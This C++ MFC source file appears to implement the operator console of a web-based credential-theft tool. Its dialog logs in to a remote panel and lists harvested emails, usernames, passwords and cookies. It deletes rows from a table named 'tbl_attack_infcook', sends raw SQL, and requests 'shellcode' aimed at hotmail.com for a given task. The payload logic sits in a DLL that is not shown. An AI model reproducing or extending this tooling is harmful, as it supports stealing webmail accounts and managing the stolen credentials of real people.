// GetWebSourceDlg.cpp : implementation file
//

#include "stdafx.h"
#include "GetWebSource.h"
#include "GetWebSourceDlg.h"
#include "afxinet.h"
#include "../dll/WebData.h"
#include "setserver.h"
#include "dlglogin.h"


#ifdef _DEBUG
#define new DEBUG_NEW //检查内存泄露
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGetWebSourceDlg dialog

CGetWebSourceDlg::CGetWebSourceDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CGetWebSourceDlg::IDD, pParent)
	, intID(0)
{
	//{{AFX_DATA_INIT(CGetWebSourceDlg)
	m_intnews = 0;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGetWebSourceDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGetWebSourceDlg)
	DDX_Control(pDX, IDC_LIST3, m_list);
	DDX_Text(pDX, IDC_EDIT1, m_intnews);
	//}}AFX_DATA_MAP
	DDX_Text(pDX, IDC_ID, intID);
}

BEGIN_MESSAGE_MAP(CGetWebSourceDlg, CDialog)
	//{{AFX_MSG_MAP(CGetWebSourceDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTGET3, Onviewinf)
	ON_BN_CLICKED(IDC_COOKIES, OnCookies)
	ON_BN_CLICKED(IDC_USER, OnViewUser)
	ON_BN_CLICKED(IDC_JSWEB, OnViewJsweb)
	ON_BN_CLICKED(IDC_delinf, Ondelinf)
	ON_BN_CLICKED(IDC_BUTTON1, OnSendMail)
	ON_BN_CLICKED(IDC_SQL, OnSql)
	ON_BN_CLICKED(IDC_inf, Oninf)
	ON_BN_CLICKED(IDC_BUTUPdata2, OnAddToMdb)
	ON_BN_CLICKED(IDC_BUT_NEW, OnButNew)
	ON_BN_CLICKED(IDC_cook, Oncook)
	ON_BN_CLICKED(IDC_buser, Onbuser)
	ON_BN_CLICKED(IDC_bjsweb, Onbjsweb)
//	ON_BN_CLICKED(IDC_dell, Ondell)
	ON_BN_CLICKED(IDC_BUT_NEW2, Onshuxin)
	ON_BN_CLICKED(IDC_getshellcode, Ongetshellcode)
//	ON_BN_CLICKED(IDC_readweb, Onreadweb)
	//}}AFX_MSG_MAP

//	ON_BN_CLICKED(IDC_getshellcode2, &CGetWebSourceDlg::OnBnClickedgetshellcode2)
ON_BN_CLICKED(IDC_SETWEB, &CGetWebSourceDlg::OnBnClickedSetweb)

ON_BN_CLICKED(IDC_BUT_LOG, &CGetWebSourceDlg::OnBnClickedButLog)
ON_BN_CLICKED(IDOK, &CGetWebSourceDlg::OnBnClickedOk)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGetWebSourceDlg message handlers


BOOL CGetWebSourceDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	
//	GetDlgItem(IDC_EDADDRESS)->SetWindowText(_T("http://10.1.1.196"));

//	m_url = "10.0.0.1";
	UpdateData(0);
	m_list.SetExtendedStyle(LVS_EX_GRIDLINES);
	m_list.InsertColumn(0,_T("userID"),LVCFMT_LEFT,70);
	m_list.InsertColumn(1,_T("taskID"),LVCFMT_LEFT,70);
	m_list.InsertColumn(2,_T("email"),LVCFMT_LEFT,70);
	m_list.InsertColumn(3,_T("user"),LVCFMT_LEFT,70);
	m_list.InsertColumn(4,_T("pass"),LVCFMT_LEFT,70);
	m_list.InsertColumn(5,_T("ID"),LVCFMT_LEFT,70);
	HRESULT hr=::CoInitialize(NULL);
	if(!SUCCEEDED(hr))
		return FALSE;
	// TODO: Add extra initialization here

	webdata.logID=0;
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}



void CGetWebSourceDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CGetWebSourceDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CGetWebSourceDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


BOOL CGetWebSourceDlg::DestroyWindow() 
{
	KillTimer(1);
	return CDialog::DestroyWindow();
}



void CGetWebSourceDlg::Onviewinf() //显示获取的帐号信息
{
	if(!webdata.logID)
	{
		MessageBox(_T("请先登录！"));
		return ;
	}
	webdata.viewinf(m_list);
//	TCHAR * buffer = webdata.strecv.GetBuffer(webdata.strecv.GetLength());
//	GetDlgItem(IDC_EDWEBSOURCE)->SetWindowText(buffer);
}



void CGetWebSourceDlg::OnCookies() 
{
	if(!webdata.logID)
	{
		MessageBox(_T("请先登录！"));
		return ;
	}
	webdata.viewcook(m_list);
}

void CGetWebSourceDlg::OnViewUser() 
{
	if(!webdata.logID)
	{
		MessageBox(_T("请先登录！"));
		return ;
	}

//	webdata.viewuser(m_list);
}

void CGetWebSourceDlg::OnViewJsweb() 
{
	if(!webdata.logID)
	{
		MessageBox(_T("请先登录！"));
		return ;
	}
//	webdata.viewjsweb(m_list);
}

void CGetWebSourceDlg::Ondelinf() 
{
//删除一条信息
	TCHAR * form = _T("tbl_attack_infcook");
	CString  id;
	
	GetDlgItem(IDC_ID)->GetWindowText(id);
	TCHAR * buffer=id.GetBuffer(id.GetLength());
	int ID=_ttoi(buffer);
	
	UpdateData(1);
	ID=intID;
	webdata.delID(form,ID);
	
}
///////////////////////////////////////////////////////

void CGetWebSourceDlg::OnSendMail() 
{
	TCHAR	path[MAX_PATH];

	ZeroMemory( path ,MAX_PATH*sizeof(TCHAR));
	GetModuleFileName(NULL, path, MAX_PATH);
	//GetCurrentDirectory(MAX_PATH,inipath);  //找到当前进程的当前目录
	TCHAR *pFind = _tcsrchr(path, _T('\\'));
	if ( pFind != NULL)
	{
		lstrcpy(pFind, _T("\\"));
	}

	lstrcat(path,_T("GUI.exe"));
	::ShellExecute(NULL,_T("open"),path,NULL,NULL,SW_SHOW);	
}

void CGetWebSourceDlg::OnSql() 
{
	CString SQL,url;

	GetDlgItem(IDC_EDI_SQL)->GetWindowText(SQL);
//	MessageBox(SQL);
	GetDlgItem(IDC_EDADDRESS)->GetWindowText(url);//获取地址
	webdata.SendSql(SQL);
	if(webdata.logID)
	{	
//		GetDlgItem(IDC_EDWEBSOURCE)->SetWindowText(webdata.strecv);//在EDIT框显示
	}
}


void CGetWebSourceDlg::logout(int userID)
{
	CString url;
	GetDlgItem(IDC_EDADDRESS)->GetWindowText(url);
	CString strurl;
	strurl.Format(_T("%s/logout.asp?userID=%d"),url,userID);
//	webdata.SendURL(strurl,0);

}




void CGetWebSourceDlg::Oninf() 
{
	webdata.viewinfformMDB(m_list);	
}

void CGetWebSourceDlg::OnAddToMdb() 
{

	webdata.WebUpToMDB();

}


void CGetWebSourceDlg::OnButNew() 
{
	bool bload = 1;

	webdata.GetNews(bload);
//	GetDlgItem(IDC_EDWEBSOURCE)->SetWindowText(webdata.strecv);
}

void CGetWebSourceDlg::Oncook() 
{
	webdata.viewcookformMDB(m_list);
	
}

void CGetWebSourceDlg::Onbuser() 
{

}

void CGetWebSourceDlg::Onbjsweb() 
{

}


void CGetWebSourceDlg::Onshuxin() 
{
	webdata.news=0;
	webdata.GetNews(0);
	m_intnews=webdata.news;
	UpdateData(false);
}

void CGetWebSourceDlg::Ongetshellcode() 
{
	CStringA cstr1;
	cstr1 = webdata.GetShellCode(_T("hotmail.com"),webdata.logID,606,_T("selifecn"),7);

	MessageBoxA(NULL,cstr1,NULL,NULL);
}
void CGetWebSourceDlg::OnBnClickedSetweb()
{
	// TODO: 在此添加控件通知处理程序代码
	CsetServer webdlg;
	webdlg.strurl=webdata.weburl;
	webdlg.DoModal();
}

void CGetWebSourceDlg::OnBnClickedButLog()
{
	// TODO: 在此添加控件通知处理程序代码

		if(webdata.logID==0) //如果logID不为0
	{
		Cdlglogin m_login;
		if(m_login.DoModal()==IDOK)
		{
			bool log=webdata.login(m_login.logurl,m_login.logusername,m_login.logpassword);

			if(log)
			{
				GetDlgItem(IDC_BUT_LOG)->SetWindowText(_T("退出"));
				webdata.GetNews();
				m_intnews=webdata.news;

				UpdateData( false );
			}
		}
		}
	else
	{
		webdata.logout();
		GetDlgItem(IDC_BUT_LOG)->SetWindowText(_T("登录"));

		webdata.logID=0;
	}
//	OnBtget2();

}

void CGetWebSourceDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
//	OnBtget2();
	OnOK();
}
